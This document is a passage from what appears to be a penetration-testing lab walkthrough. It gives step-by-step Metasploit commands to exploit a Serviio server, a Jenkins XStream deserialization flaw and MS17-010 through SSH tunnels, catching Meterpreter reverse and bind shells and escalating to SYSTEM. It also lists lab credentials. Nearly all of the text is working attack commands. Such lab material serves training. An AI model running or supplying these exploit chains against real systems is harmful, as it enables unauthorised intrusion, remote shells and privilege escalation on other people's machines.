#### 6.1 Low Priv Shell - Reverse shell payload

target2 can be exploited without using any credentials, however, these will also work if you need an initial foothold.

credentials (dory / bLu3FisH)

```
ssh $USER@$JB1 -L 23423:$TARGET2:23423 -R $JB1:60000:127.0.0.1:60000
```

SHELL1:
```
sudo msfdb run
```

Specify the exploit to use.
```
use exploit/windows/http/ serviio_checkstreamurl_cmd_exec
```

Leverage a -L forward tunnel through one of the jumpboxes.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 23423
```

Specify payload.
```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Configure the payload to call back to one of the jumpbox's 10dot IPs.
```
set LHOST 10.1.1.10
```

```
set LPORT 60000
```

The callback will be handled by a separate payloadhandler, so disable it in this msfconsole.
```
set DisablePayloadHandler True
```

Double check everything.
```
show options
```

```
check
```

SHELL 2:
```
sudo msfdb run
```

Start a generic payload handler.
```
use exploit/multi/handler
```

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

```
set LHOST 127.0.0.1
```

```
set LPORT 60000
```

```
run
```

SHELL 1:
```
exploit
```

#### 6.2 Low Priv Shell - Bind shell payload

Same as previous exercise, but configure the payload to be a bind shell.

```
ssh $USER@$JB1 -L 23423:$TARGET2:23423 -L 50000:$TARGET2:50000
```

SHELL1:
```
sudo msfdb run
```

Specify the exploit to use.
```
use exploit/windows/http/ serviio_checkstreamurl_cmd_exec
```

Leverage a -L forward tunnel through one of the jumpboxes.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 23423
```

Specify payload.
```
set PAYLOAD windows/meterpreter/bind_tcp
```

Configure the payload to listen on all interfaces.
```
set LHOST 0.0.0.0
```

```
set LPORT 50000
```

The callback will be handled by a separate payloadhandler, so disable it in this msfconsole.
```
set DisablePayloadHandler True
```

Double check everything.
```
show options
```

```
check
```

```
exploit
```

#### 6.3 Windows System-level Shell Option 1 - Reverse shell payload

Use msfconsole’s portfwd command in the serviio exploit shell to access the jenkins console listening on 127.0.0.1:8888.

Add a -L equivalent using meterpreter.
```
portfwd add -L 127.0.0.1 -l 8888 -r 127.0.0.1 -p 8888
```

Background the current session, we will be using the same payload and payload handler to catch the next callback.
```
background
```

Specify the exploit to use.
```
use multi/http/ jenkins_xstream_deserialize
```

Leverage the portfwd -L forward tunnel through meterpreter payload.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 8888
```

Specify the target type to be a Windows dropper.
```
set TARGET 5
```

Specify payload.
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Configure the payload to call back to one of the jump box 10dot IPs.
```
set LHOST 10.1.1.10
```

```
set LPORT 60000
```

The callback will be handled by a separate payloadhandler, so disable it in this msfconsole.
```
set DisablePayloadHandler True
```

Double check everything.
```
show options
```

```
check
```

SHELL 2:
```
sudo msfdb run
```

Start a generic payload handler.
```
use exploit/multi/handler
```

Be sure your PAYLOAD matches what is specified in the exploit.  Either the 32 or 64-bit are options with this exploit.

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

```
set LHOST 127.0.0.1
```

```
set LPORT 60000
```

```
run
```

SHELL 1:
```
exploit
```

#### 6.4 Windows System-level Shell Option 2 - Reverse shell payload

Same as previous exercise, but configure the payload to be a bind shell.

Use msfconsole’s portfwd command in the serviio exploit shell to access Windows SMB ipc$ share listening on 127.0.0.1:445

Retrieve the current process id of your serviio meterpreter shell.

```
getpid
```

Compare that to the process list to determine the name of the current
running meterpreter.exe from the process list.  The .exe should be running
out of the C:\ Progra ~1\ Serviio\bin\ directory.
```
ps
```

Add a -L equivalent using meterpreter.
```
portfwd add -L 127.0.0.1 -l 4450 -r 127.0.0.1 -p 445
```

Background the current session , we will be using the same payload and payload handler to catch the next callback.
```
background
```

Specify the exploit to use.
```
use auxiliary/admin/smb/ms17_010_command
```

Leverage the portfwd -L forward tunnel through meterpreter payload.
```
set RHOSTS 127.0.0.1
```

```
set RPORT 4450
```

Specify the operating system credentials.
```
set SMBUser dory
```

```
set SMBPass bLu3FisH
```

Specify the serviio payload that we want to have run as administrator/system.  We are going to shorten "Program Files" to progra ~1 to avoid any issues parsing  the command.  The payload mgOhS.exe , will be randomly generated when you originally exploit on. 
```
set command "C:\Progra~1\ Serviio\bin\mgOhS.exe"
```

Double -check everything.
```
show options
```

SHELL 2:
```
sudo msfdb run
```

Start a generic payload handler.  This payload handler has to match what was used for the original serviio exploit , since we will be running the existing `C:\ Progra ~1\ Serviio\bin\mgOhS.exe` executable as system.

Start a generic payload handler.
```
use exploit/multi/handler
```

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

```
set LHOST 127.0.0.1
```

```
set LPORT 60000
```

```
run
```

SHELL 1:
```
exploit
```
